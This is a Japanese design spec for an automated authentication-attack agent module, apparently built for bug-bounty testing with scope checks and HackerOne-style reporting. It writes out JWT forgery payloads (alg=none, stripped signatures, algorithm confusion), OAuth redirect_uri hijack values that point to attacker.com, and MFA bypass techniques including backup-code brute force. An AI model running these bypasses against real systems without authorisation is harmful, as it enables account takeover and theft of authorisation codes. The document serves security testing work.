---
task_id: SGK-2026-0031
doc_type: spec
status: active
parent_task_id: null
related_docs: []
created_at: '2026-05-19'
updated_at: '2026-07-02'
---

# AuthNinja - 認証突破エージェント

**モジュールパス**: `src/agents/swarm/auth_ninja.py`

---

## 概要 (Overview)

**AuthNinja** は、認証・認可メカニズムに対する攻撃を専門とするエージェント群の統合モジュールです。JWT、OAuth 2.0、多要素認証（MFA）など、現代の Web アプリケーションで使用される主要な認証方式に対するバイパス技術を実装しています。

**サブエージェント構成**:

1. **JWTInspector**: JWT 署名検証のバイパス
2. **OAuthDancer**: OAuth リダイレクトのハイジャック
3. **MFABypasser**: 二要素認証の回避

---

## アーキテクチャ (Architecture)

```
┌─────────────────────────────────────────────────────────────────────┐
│                         AuthNinja (Coordinator)                      │
│                                                                      │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐      │
│  │   JWTInspector  │  │   OAuthDancer   │  │   MFABypasser   │      │
│  └────────┬────────┘  └────────┬────────┘  └────────┬────────┘      │
│           │                    │                    │               │
│           ▼                    ▼                    ▼               │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │                     Attack Execution Layer                    │   │
│  │  - RAG Query (bypass techniques from Obsidian)                │   │
│  │  - EthicsGuard (scope enforcement)                            │   │
│  │  - Finding Generation (auto-report ready)                     │   │
│  └──────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
                    ┌────────────────────────┐
                    │   Target Auth System   │
                    └────────────────────────┘
```

---

## JWTInspector - JWT 攻撃エンジン

### 概要

JWTInspector は、JSON Web Token (JWT) の署名検証をバイパスするための複数の攻撃手法を実装しています。

### 実装されている攻撃手法

#### 1. Algorithm None Attack (`alg=none`)

署名アルゴリズムを `none` に変更し、署名検証をスキップさせます。

```
元のトークン:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SIGNATURE

攻撃トークン:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

**バリエーション**:

- `"alg": "none"`
- `"alg": "None"`
- `"alg": "NONE"`
- `"alg": "nOnE"`

#### 2. Signature Stripping

署名部分を削除、または空文字に置き換えます。

```
# 署名削除
header.payload.

# 空署名
header.payload.ew==
```

#### 3. Algorithm Confusion (RS256 → HS256)

公開鍵を使って HMAC 署名を行い、サーバーを混乱させます。

```python
# 攻撃ロジック
original_alg = "RS256"  # 非対称鍵
forged_alg = "HS256"    # 対称鍵
# サーバーの公開鍵をHMACの秘密鍵として使用
```

### API

```python
class JWTInspector:
    def __init__(self, rag_switch: RAGSwitch = None, ethics_guard: EthicsGuard = None):
        ...

    def execute(self, target_url: str, context: dict) -> HandoffResult:
        """
        JWT攻撃を実行します。

        Args:
            target_url: テスト対象のエンドポイント
            context: {
                "token": str,           # 元のJWTトークン
                "test_endpoint": str,   # 認証確認用エンドポイント
                "timeout": int          # リクエストタイムアウト
            }

        Returns:
            HandoffResult: 攻撃結果（成功時はforged_tokenを含む）
        """
```

### 使用例

```python
from src.agents.swarm import JWTInspector
from src.core.rag import get_rag_switch

# 初期化
rag = get_rag_switch()
inspector = JWTInspector(rag_switch=rag)

# 攻撃実行
result = inspector.execute(
    target_url="https://api.target.com/me",
    context={
        "token": "eyJhbGciOiJIUzI1NiIs...",
        "test_endpoint": "https://api.target.com/me",
        "timeout": 10
    }
)

if result.result == AgentResult.SUCCESS:
    print(f"🎯 Bypass successful!")
    print(f"Method: {result.bypass_method}")
    print(f"Forged Token: {result.credentials['forged_jwt']}")
```

---

## OAuthDancer - OAuth 攻撃エンジン

### 概要

OAuthDancer は、OAuth 2.0/OpenID Connect フローの脆弱性を検出します。

### 実装されている攻撃手法

#### 1. Redirect URI Manipulation

`redirect_uri` パラメータを改ざんし、認可コードを攻撃者のサーバーにリダイレクトさせます。

**テストパターン**:

```
# オープンリダイレクト
redirect_uri=https://attacker.com

# サブドメイン置換
redirect_uri=https://evil.target.com

# パス操作
redirect_uri=https://target.com/callback/../../../attacker

# JavaScriptスキーム
redirect_uri=javascript:alert(1)
```

#### 2. PKCE Downgrade Attack

PKCE (Proof Key for Code Exchange) 保護を無効化します。

```python
# 攻撃ロジック
# Step 1: code_challenge / code_verifier パラメータを削除
# Step 2: 通常のOAuthフローで認可コードを取得
# Step 3: 認可コードの横取り可能性を検証
```

#### 3. State Parameter Bypass

CSRF トークンとして機能する `state` パラメータの検証をテストします。

### API

```python
class OAuthDancer:
    def execute(self, target_url: str, context: dict) -> HandoffResult:
        """
        OAuth攻撃を実行します。

        Args:
            context: {
                "auth_endpoint": str,     # 認可エンドポイント
                "client_id": str,         # クライアントID
                "redirect_uri": str,      # 正規のリダイレクトURI
                "scope": str              # 要求スコープ
            }
        """
```

---

## MFABypasser - 多要素認証回避エンジン

### 概要

MFABypasser は、二要素認証（2FA/MFA）の実装不備を検出します。

### 実装されている攻撃手法

#### 1. Response Manipulation

クライアントサイドの MFA 検証を回避します。

```javascript
// サーバーレスポンス
{"mfa_required": true, "user_id": 123}

// 改ざん後
{"mfa_required": false, "user_id": 123}
```

#### 2. Direct API Access

MFA 画面を経由せず、認証済み API に直接アクセスを試みます。

```
# MFA後にのみアクセス可能なはずのエンドポイント
GET /api/v1/user/profile
Authorization: Bearer <pre-mfa-token>
```

#### 3. Backup Code Brute Force

バックアップコードの総当たり攻撃（レート制限がない場合）。

### API

```python
class MFABypasser:
    def execute(self, target_url: str, context: dict) -> HandoffResult:
        """
        MFA回避攻撃を実行します。

        Args:
            context: {
                "pre_mfa_token": str,     # MFA前のセッショントークン
                "mfa_endpoint": str,      # MFA検証エンドポイント
                "protected_endpoint": str # MFA後にアクセス可能なエンドポイント
            }
        """
```

---

## RAG 統合 (Knowledge Augmentation)

AuthNinja は、Obsidian RAG からバイパス技術を動的に取得します。

### 動作フロー

1. 攻撃実行前に、RAG に対して「jwt alg none bypass」などのクエリを送信
2. 類似のナレッジノートが存在すれば、そのパターンを優先的に試行
3. ノートに記載された新しいバイパス手法を自動的に学習

### Obsidian メモの書き方

````markdown
# JWT alg=none Bypass

## Condition

サーバーが `alg` ヘッダーを検証せずに受け入れる場合に有効。

## Payload Pattern

```json
{ "alg": "none", "typ": "JWT" }
```
````

## Bypass Steps

1. トークンをデコード
2. ヘッダーの `alg` を `none` に変更
3. 署名部分を空にする
4. 再エンコードしてリクエストに使用

````

---

## Finding生成 (Auto-Report Integration)

攻撃成功時、自動的に `Finding` オブジェクトが生成されます。

```python
Finding(
    title="JWT Algorithm None Bypass",
    severity=Severity.CRITICAL,
    vuln_type=VulnType.JWT_ALG_NONE,
    description="The target accepts JWT tokens with 'alg': 'none'...",
    evidence=[Evidence(...)],
    affected_url="https://api.target.com/me"
)
````

この Finding は `AutoReporter` に渡され、HackerOne 形式のレポートが自動生成されます。

---

## トラブルシューティング

### 症状: すべての攻撃が失敗する

**原因**: ターゲットが適切に JWT を検証している（セキュア）
**解決策**: これは正常な動作。別の攻撃ベクター（IDOR、ビジネスロジック）に移行。

### 症状: `ScopeViolationError` が発生する

**原因**: OAuth `redirect_uri` テストがスコープ外ドメインを参照
**解決策**: `scope.yaml` でテスト用のコールバック URL を許可するか、この攻撃をスキップ。
